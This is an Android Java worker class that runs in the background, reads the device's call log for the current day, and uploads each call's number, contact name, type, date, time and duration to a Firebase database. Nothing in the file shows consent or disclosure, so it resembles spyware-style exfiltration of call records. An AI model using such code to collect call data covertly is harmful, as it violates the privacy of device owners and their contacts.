package com.example.equivalent.utility;

import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.example.equivalent.model.CallLogModel;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SendDataWorker extends Worker {

    private static final String TAG = SendDataWorker.class.getSimpleName();
    private String str_number, str_contact_name, str_call_type, str_call_full_date,
            str_call_date, str_call_time, str_call_duration;

    public SendDataWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }
    @NonNull
    @Override
    public Result doWork() {
        Context context = getApplicationContext();
        Log.i(TAG, "Sending data to Server started");
        try {
            SendData(context);
        }
        catch (Exception e){
            Result.retry();
        }
        return Result.success();
    }

    private void SendData(Context ctx) {
        // reading all data in descending order according to DATE
        String sortOrder = CallLog.Calls.DATE + " ASC";
        String mSelectionClause = android.provider.CallLog.Calls.DATE + " >= ?";
        String timestamp = String.valueOf(getTodayTimestamp());

        Log.d("MyDate", "FetchCallLogs: " + timestamp);

        Cursor cursor = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                mSelectionClause,
                new String[]{timestamp},
                sortOrder);

        //looping through the cursor to add data into arraylist
        while (cursor.moveToNext()){
            str_number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
            str_contact_name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
            str_contact_name = str_contact_name==null || str_contact_name.equals("") ? "Unknown" : str_contact_name;
            str_call_type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
            str_call_full_date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
            str_call_duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));

            SimpleDateFormat dateFormatter = new SimpleDateFormat(
                    "dd MMM yyyy");
            str_call_date = dateFormatter.format(new Date(Long.parseLong(str_call_full_date)));

            SimpleDateFormat timeFormatter = new SimpleDateFormat(
                    "HH:mm:ss");
            str_call_time = timeFormatter.format(new Date(Long.parseLong(str_call_full_date)));

            //str_call_time = getFormatedDateTime(str_call_time, "HH:mm:ss", "hh:mm ss");

            switch(Integer.parseInt(str_call_type)){
                case CallLog.Calls.INCOMING_TYPE:
                    str_call_type = "Incoming";
                    break;
                case CallLog.Calls.OUTGOING_TYPE:
                    str_call_type = "Outgoing";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    str_call_type = "Missed";
                    break;
                case CallLog.Calls.VOICEMAIL_TYPE:
                    str_call_type = "Voicemail";
                    break;
                case CallLog.Calls.REJECTED_TYPE:
                    str_call_type = "Rejected";
                    break;
                case CallLog.Calls.BLOCKED_TYPE:
                    str_call_type = "Blocked";
                    break;
                case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                    str_call_type = "Externally Answered";
                    break;
                default:
                    str_call_type = "NA";
            }

            str_call_duration = DurationFormat(str_call_duration);

            CallLogModel callLogItem = new CallLogModel(str_number, str_contact_name, str_call_type,
                    str_call_date, str_call_time, str_call_duration);

            SendDataToServer(callLogItem);
           // sendDataToUser(str_number);
        }
    }
    private void SendDataToServer(CallLogModel callLogItem) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("CallLog")
                .child(callLogItem.getCallDate())
                .child(callLogItem.getCallTime());
        myRef.setValue(callLogItem);
    }
    private void sendDataToUser(String incomingNumber) {
        Map<String, Object> user = new HashMap<>();
        user.put("senderNum", incomingNumber);
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        db.collection("userscalls1")
                .add(user)
                .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                    @Override
                    public void onSuccess(DocumentReference documentReference) {
                        Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId());
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        Log.w(TAG, "Error adding document", e);
                    }
                });
    }

    public String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.startsWith(manufacturer)) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        if (Character.isUpperCase(first)) {
            return s;
        } else {
            return Character.toUpperCase(first) + s.substring(1);
        }
    }

    private String DurationFormat(String duration) {
        String durationFormatted=null;
        if(Integer.parseInt(duration) < 60){
            durationFormatted = duration+" sec";
        }
        else{
            int min = Integer.parseInt(duration)/60;
            int sec = Integer.parseInt(duration)%60;

            if(sec==0)
                durationFormatted = min + " min" ;
            else
                durationFormatted = min + " min " + sec + " sec";

        }
        return durationFormatted;
    }

    private String getFormatedDateTime(String dateStr, String strInputFormat, String strOutputFormat) {
        String formattedDate = dateStr;
        DateFormat inputFormat = new SimpleDateFormat(strInputFormat, Locale.getDefault());
        DateFormat outputFormat = new SimpleDateFormat(strOutputFormat, Locale.getDefault());
        Date date = null;
        try {
            date = inputFormat.parse(dateStr);
        } catch (ParseException e) {
        }

        if (date != null) {
            formattedDate = outputFormat.format(date);
        }
        return formattedDate;
    }
    public long getTodayTimestamp() {
        Calendar c1 = Calendar.getInstance();
        c1.setTime(new Date());

        Calendar c2 = Calendar.getInstance();
        c2.set(Calendar.YEAR, c1.get(Calendar.YEAR));
        c2.set(Calendar.MONTH, c1.get(Calendar.MONTH));
        c2.set(Calendar.DAY_OF_MONTH, c1.get(Calendar.DAY_OF_MONTH));
        c2.set(Calendar.HOUR_OF_DAY, 0);
        c2.set(Calendar.MINUTE, 0);
        c2.set(Calendar.SECOND, 0);

        return c2.getTimeInMillis();
    }
}
